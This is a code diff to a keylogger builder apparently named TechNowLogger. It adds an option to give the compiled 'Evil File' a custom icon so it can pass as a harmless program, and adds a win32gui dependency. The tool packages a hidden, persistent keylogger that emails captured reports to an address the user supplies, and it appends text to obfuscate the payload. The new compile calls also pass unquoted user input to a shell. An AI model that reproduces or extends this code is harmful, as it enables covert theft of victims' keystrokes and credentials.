@@ -12,7 +12,7 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
 
 def get_arguments():
-    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.2')
+    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.3')
     parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
     parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
@@ -21,6 +21,7 @@ def get_arguments():
     
 
     required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
+    required_arguments.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")
     required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
     required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
     required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
@@ -29,7 +30,7 @@ def get_arguments():
 def check_dependencies():
     print(f"{YELLOW}\n[*] Checking Dependencies...")
     try:
-        import mss, essential_generators, PyInstaller, pynput, six
+        import mss, essential_generators, PyInstaller, pynput, six, win32gui
         print(f"{GREEN}[+] All Dependencies are Installed on this system ;)\n")
     except Exception as e:
         print(f"[!] Error : {e}")
@@ -44,6 +45,7 @@ def check_dependencies():
                 pip.main(['install', 'pynput==1.4.4'])
                 pip.main(['install', 'six==1.12.0']) 
                 pip.main(['install', 'python-xlib==0.25'])
+                pip.main(['install', 'win32gui'])
                 print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]\n')
                 print(f"{GREEN}\n[+] Dependencies installed correctly ;)\n")
                 break
@@ -65,11 +67,11 @@ def obfuscating_payload(file_name):
     with open(file_name, "a") as file:
         file.write(text)
 
-def compile_for_windows(file_name):
-    subprocess.call([WINDOWS_PYTHON_PYINSTALLER_PATH, "--onefile", "--noconsole", "--hidden-import=pynput.keyboard", "--hidden-import=keylogger", file_name])
+def compile_for_windows(file_name, icon_path):
+    subprocess.call(f"{WINDOWS_PYTHON_PYINSTALLER_PATH} --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
-def compile_for_linux(file_name):
-    subprocess.call(["pyinstaller", "--onefile", "--noconsole", "--hidden-import=pynput.keyboard", "--hidden-import=keylogger", file_name])
+def compile_for_linux(file_name, icon_path):
+    subprocess.call(f"pyinstaller --onefile --noconsole --hidden-import=pynput.keyboard --hidden-import=keylogger {file_name} -i {icon_path}", shell=True)
 
 def del_junk_file(file_name):
     build = os.getcwd() + "\\build"
@@ -101,7 +103,8 @@ if __name__ == '__main__':
         print(f'   {YELLOW}Password:{RED} ' + arguments.password) 
         print(f'   {YELLOW}Log\'s Send Interval:{RED} Every ' + str(arguments.interval) + ' seconds')
         print(f'   {YELLOW}Becomes Persistence After:{RED} ' + str(arguments.time_persistent) + ' seconds')
-        print(f'   {YELLOW}Output Evil File Name:{RED} ' + arguments.out)        
+        print(f'   {YELLOW}Output Evil File Name:{RED} ' + arguments.out) 
+        print(f'   {YELLOW}Icon Path:{RED} ' + arguments.icon)
         print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
         
         ask = input(f'\n{WHITE}[?] These info above are correct? (y/n) : ')
@@ -113,7 +116,8 @@ if __name__ == '__main__':
             arguments.password = input('[?] Type your gmail password: ')
             arguments.interval = int(input('[?] Time interval to send logs; [In Seconds]: '))
             arguments.time_persistent = int(input('[?] Time after to become persistence; [In Seconds]: '))   
-            arguments.out = input('[?] Output Evil File Name: ')             
+            arguments.out = input('[?] Output Evil File Name: ')  
+            arguments.icon = input('[?] Icon Path (If Present In This Directory, then just type Name): ')               
 
         check_dependencies()
 
@@ -128,10 +132,10 @@ if __name__ == '__main__':
         print(f"{MAGENTA}")
 
         if arguments.windows:
-            compile_for_windows(arguments.out)
+            compile_for_windows(arguments.out, arguments.icon)
 
         if arguments.linux:
-            compile_for_linux(arguments.out)
+            compile_for_linux(arguments.out, arguments.icon)
 
         print(f"\n{YELLOW}[*] Deleting Junk Files...")
         del_junk_file(arguments.out)
